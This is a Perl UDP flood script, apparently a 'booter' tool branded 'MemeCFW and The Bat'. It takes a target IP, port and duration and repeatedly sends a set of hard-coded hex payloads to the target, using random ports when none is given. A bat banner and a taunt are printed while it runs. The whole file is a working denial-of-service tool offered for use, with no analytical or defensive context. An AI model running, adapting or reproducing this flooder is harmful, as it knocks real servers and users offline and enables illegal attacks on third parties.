#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
	
use Socket;
use strict;

my ($ip,$port,$time) = @ARGV;

my ($iaddr,$endtime,$pport);
my @packets = (
    "000100460000d2be00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000083a2",
    "000100460000d2be00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000078e4",
    "1337cafe01000000",
    "90f8d13dd74812950000d2bee64376022c70d23ec79f529944839ce257b450442fd36e0d21fd87f10a956c",
    "9078d13ed74818350000d2bebede0002fd474dfc9ae8cd3aa87dfc61a30f63735c66c7c940c721c84120c400000080",
    "9078d13fd7481bf50000d2bebede000230e711b76b9f346d4b98fa536c2199e274923b193d5054202ca43c01000080",
    "9078d140d7481fb50000d2bebede0002f5feb3aded9e25757bd720da32bc9df123d33625a66deb62a92e4002000080",
    "9078d141d74823750000d2bebede00025249313c615973fe899051d666db0ce60e2d4b7d0ff5719c8020e503000080",
    "9078d142d74827350000d2bebede0002d5d04cc0a2776fc054dd7b77b317f6667db562406caa37b87bb85304000080",
    "9078d143d7482af50000d2bebede00025831f1a418cf1a73fed74f11df9ab1ed816ccff46560702fc5086b05000080",
    "9078d144d7482eb50000d2bebede0002f3b528941edcae449d86af7a06f4c6423cc1afb7180815092cc93706000080",
    "9078d145d74832750000d2bebede0002f0b56a8b215f3d49e5cf4f4989743416a27c32321a64153a735e4807000080",
    "9078d146d74836350000d2bebede00028def5295411026e228a1149d2c6c299fce3b00f8f718b6340ce1cd08000080",
);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;

MMMMMMMMMMMMMMMMMMMMM                              MMMMMMMMMMMMMMMMMMMMM
 `MMMMMMMMMMMMMMMMMMMM           N    N           MMMMMMMMMMMMMMMMMMMM'
   `MMMMMMMMMMMMMMMMMMM          MMMMMM          MMMMMMMMMMMMMMMMMMM'  
     MMMMMMMMMMMMMMMMMMM-_______MMMMMMMM_______-MMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM    
     .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.    
    MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  
                   `MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM'                
                          `MMMMMMMMMMMMMMMMMM'                    
                              `MMMMMMMMMM'                              
                                 MMMMMM                         
                                  MMMM                                  
                                   MM                                  


EOTEXT

print "MemeCFW and The Bat Dropped Yo Shit $ip " . ($port ? $port : "Random") . " Port With Custom Packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop NULLING With Ctrl-C\n" unless $time;

my @binary_packets = map { pack("H*", $_) } @packets;

for (;time() <= $endtime;) {
  $pport = $port ? $port : int(rand(65500))+1;
  
  foreach my $packet (@binary_packets) {
    send(flood, $packet, 0, pack_sockaddr_in($pport, $iaddr));
  }

}

